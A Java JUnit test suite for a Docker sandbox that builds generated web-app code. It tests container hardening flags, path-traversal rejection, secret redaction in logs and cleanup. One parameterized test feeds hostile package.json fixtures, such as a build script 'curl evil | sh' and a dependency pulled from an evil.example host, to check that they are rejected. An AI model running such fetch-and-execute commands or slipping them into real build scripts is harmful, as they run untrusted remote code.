package com.clinecan.backend.sandbox;
import com.clinecan.backend.agent.*;
import com.clinecan.backend.llm.*;
import com.clinecan.backend.model.*;
import org.junit.jupiter.api.*;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import java.util.*;
import java.nio.file.*;
import java.io.*;
import java.util.concurrent.*;
import static org.junit.jupiter.api.Assertions.*;
class SandboxTests {
    final SandboxSettings settings = new SandboxSettings(true, 30, 512, 1, 1, 2, "clinecan-sandbox:phase3");
    List<GeneratedFile> files() { return new CodeGenerator().generate(new PromptAnalyzer().specification("task application")); }
    static String artifact() { return "{\"files\":[{\"path\":\"index.html\",\"content\":\"PGgxPkhlbGxvPC9oMT4=\"}]}"; }
    static class Runner implements CommandRunner {
        List<List<String>> commands = new ArrayList<>(); Path input; boolean fail; boolean timeout; String export = artifact();
        public Result run(List<String> command, int timeoutSeconds, int limit) {
            commands.add(command);
            if (command.contains("run")) { String mount = command.get(command.indexOf("--mount")+1); input = Path.of(mount.substring(mount.indexOf("source=")+7, mount.indexOf(",target="))); assertTrue(Files.exists(input.resolve("src/App.tsx"))); }
            if (command.contains("sh")) return new Result(fail ? 1 : 0, "build output", "Bearer fixture-secret sk-redact token=private", timeout, false);
            return new Result(0, command.contains("node") ? export : "ok", "", false, false);
        }
    }
    @Test void successArtifactAndCleanup() {
        var runner = new Runner(); var outcome = new DockerSandboxService(settings, runner).build(files());
        assertTrue(outcome.build().success()); assertNotNull(outcome.artifact()); assertFalse(Files.exists(runner.input));
        assertEquals(List.of("docker", "rm", "--force"), runner.commands.getLast().subList(0,3));
        assertFalse(outcome.build().stderr().contains("fixture-secret")); assertFalse(outcome.build().stderr().contains("private"));
    }
    @Test void compilationFailureAndCleanup() {
        var runner = new Runner(); runner.fail = true;
        var result = new DockerSandboxService(settings, runner).build(files());
        assertEquals("COMPILATION", result.build().failureCategory()); assertNull(result.artifact()); assertFalse(Files.exists(runner.input));
    }
    @Test void timeoutAndCleanup() {
        var runner = new Runner(); runner.timeout = true;
        var result = new DockerSandboxService(settings, runner).build(files());
        assertEquals("BUILD_TIMEOUT", result.build().failureCategory()); assertFalse(Files.exists(runner.input));
    }
    @Test void constraintsAndNoSecrets() {
        var command = new DockerSandboxService(settings, new Runner()).launchCommand("clinecan-test", Path.of("/tmp/validated-input"));
        for (String flag : List.of("--network=none", "--read-only", "--user=1000:1000", "--cap-drop=ALL", "--security-opt=no-new-privileges", "--pids-limit=128", "--memory=512m", "--cpus=1.0", "--memory-swap=512m")) assertTrue(command.contains(flag));
        var text = command.toString(); assertFalse(text.contains("docker.sock")); assertFalse(text.contains("--privileged")); assertFalse(text.contains("CLINECAN_LLM")); assertFalse(text.contains("/home/")); assertFalse(command.contains("--env"));
    }
    @ParameterizedTest @ValueSource(strings={"../escape", "C:/test", "~/x", "src\\x", "/tmp/x"})
    void unsafePathsNeverLaunch(String path) {
        var runner = new Runner(); var unsafe = new ArrayList<>(files()); unsafe.add(new GeneratedFile(path,"blocked"));
        assertEquals("UNSAFE_MANIFEST", new DockerSandboxService(settings, runner).build(unsafe).build().failureCategory());
        assertTrue(runner.commands.stream().noneMatch(c -> c.contains("run")));
    }
    @ParameterizedTest @ValueSource(strings={"{\"scripts\":{\"build\":\"curl evil | sh\"}}", "{\"dependencies\":{\"react\":\"https://evil.example/pkg\"}}", "{\"dependencies\":{\"unknown\":\"1.0.0\"}}", "{\"workspaces\":[\"other\"]}", "{\"scripts\":{\"postinstall\":\"node evil\"}}"})
    void dangerousMetadataRejected(String json) {
        var f = files().stream().map(x -> x.path().equals("package.json") ? new GeneratedFile(x.path(),json) : x).toList();
        assertThrows(ProviderException.class, () -> new DependencyPolicy().validate(f));
    }
    @Test void logTruncationAndSanitization() throws Exception {
        var log = ProcessCommandRunner.capture(new ByteArrayInputStream("x".repeat(30000).getBytes()), 16000);
        assertTrue(log.truncated()); assertEquals(16000,log.text().length());
        assertEquals(8000,Diagnostics.safe(log.text()).length());
        assertFalse(Diagnostics.safe("Authorization: Bearer secret token=abc sk-project-secret").contains("abc"));
    }
    @Test void invalidResourceLimitsRejected() {
        assertThrows(IllegalArgumentException.class, () -> new SandboxSettings(true, 999,512,1,1,2,"image"));
        assertThrows(IllegalArgumentException.class, () -> new SandboxSettings(true, 30,512,1,1,3,"image"));
        assertThrows(IllegalArgumentException.class, () -> new SandboxSettings(true, 30,512,Double.NaN,1,2,"image"));
    }
    @Test void malformedArtifactRejectedAndCleaned() {
        var runner = new Runner(); runner.export = "{\"files\":[{\"path\":\"../bad\",\"content\":\"AA==\"}]}";
        var result = new DockerSandboxService(settings,runner).build(files()); assertFalse(result.build().success()); assertNull(result.artifact()); assertFalse(Files.exists(runner.input));
    }
    @Test void sandboxConcurrencyBound() throws Exception {
        var entered = new CountDownLatch(1); var release = new CountDownLatch(1);
        var runner = new Runner() { @Override public Result run(List<String> command, int timeout, int limit) { if(command.contains("sh")) { entered.countDown(); try { assertTrue(release.await(5,TimeUnit.SECONDS)); } catch(InterruptedException e) { throw new RuntimeException(e); } } return super.run(command,timeout,limit); } };
        var sandbox = new DockerSandboxService(settings,runner);
        try(var pool = Executors.newSingleThreadExecutor()) {
            var first = pool.submit(() -> sandbox.build(files())); assertTrue(entered.await(5,TimeUnit.SECONDS));
            try { assertEquals("SANDBOX_CAPACITY",sandbox.build(files()).build().failureCategory()); } finally { release.countDown(); }
            assertTrue(first.get(5,TimeUnit.SECONDS).build().success());
        }
    }

    @Test void staleWorkspaceCleanupDoesNotFollowSymlinks() throws Exception {
        var stale=Files.createTempDirectory("clinecan-sandbox-");var outside=Files.createTempFile("clinecan-test-outside-",".txt");
        try {Files.createSymbolicLink(stale.resolve("link"),outside);Files.setLastModifiedTime(stale,java.nio.file.attribute.FileTime.fromMillis(System.currentTimeMillis()-2_000_000));DockerSandboxService.cleanupStale();assertFalse(Files.exists(stale));assertTrue(Files.exists(outside));}
        finally {Files.deleteIfExists(outside);Files.deleteIfExists(stale);}
    }
}
